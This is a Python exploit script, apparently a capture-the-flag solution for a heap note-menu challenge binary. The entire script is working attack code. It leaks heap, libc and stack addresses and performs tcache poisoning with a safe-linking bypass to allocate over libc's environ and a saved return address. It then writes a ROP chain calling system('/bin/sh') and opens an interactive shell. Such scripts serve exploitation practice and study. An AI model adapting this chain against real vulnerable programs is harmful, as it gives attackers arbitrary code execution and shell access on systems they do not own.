#!/usr/bin/env python

import ptrlib as ptr

def new(index, size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("Index: ", index)
    sock.sendlineafter("Size: ", size)


def edit(index, size, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("Index: ", index)
    sock.sendlineafter("Size: ", size)
    sock.sendlineafter("Data: ", data)


def show(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("Index: ", index)
    return sock.recvlineafter("Note: ")


def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("Index: ", index)


libc = ptr.ELF("./libc.so.6")
sock = ptr.Process("./chall_patched")

new(0, 0x18)
delete(0)
new(0, 0x18)
heap_base = (ptr.u64(show(0)) ^ 0) << 12
ptr.logger.info(f"Heap Base: {hex(heap_base)}")

# Heap Address Leak
new(1, 0x419)
new(2, 0x18)  # preventation of consolidation
delete(1)

# Libc Address Leak
new(1, 0x419)
libc.base = ptr.u64(show(1)) - libc.main_arena() - 0x60

# Clean chunks
delete(2)
delete(1)
delete(0)

# tcache poisoning: Stack Address
new(2, 0x28)
new(0, 0x48)
new(1, 0x48)
delete(1)
delete(0)
target = libc.symbol("environ")
payload = b"A" * 0x28
payload += ptr.p64(0x51)
payload += ptr.p64(target ^ (heap_base + 0x2F0 >> 12))
edit(2, 0, payload)  # Overwrite tcache link
new(0, 0x48)  # Dummy
new(1, 0x48)  # malloc on environ
addr_stack = ptr.u64(show(1)) - 0x120
ptr.logger.info(f"Stack: {hex(addr_stack)}")

# Clean chunks
delete(0)
delete(2)

# Tcache poisoning: Write ROP chain
new(2, 0x38)
new(0, 0x108)
new(3, 0x108)
delete(3)
delete(0)
target = addr_stack - 8
payload = b"A" * 0x38
payload += ptr.p64(0x111)
payload += ptr.p64(target ^ (heap_base + 0x3D0 >> 12))
edit(2, 0, payload)
new(0, 0x108)  # Dummy
new(3, 0x108)  # malloc on return address - 8

chain = b"A" * 8
chain += ptr.p64(next(libc.gadget("ret")))
chain += ptr.p64(next(libc.gadget("pop rdi; ret;")))
chain += ptr.p64(next(libc.find("/bin/sh")))
chain += ptr.p64(libc.symbol("system"))

edit(3, 0x100, chain)
sock.sendline(b"5")
sock.recvuntil(b"> ")

sock.sh()
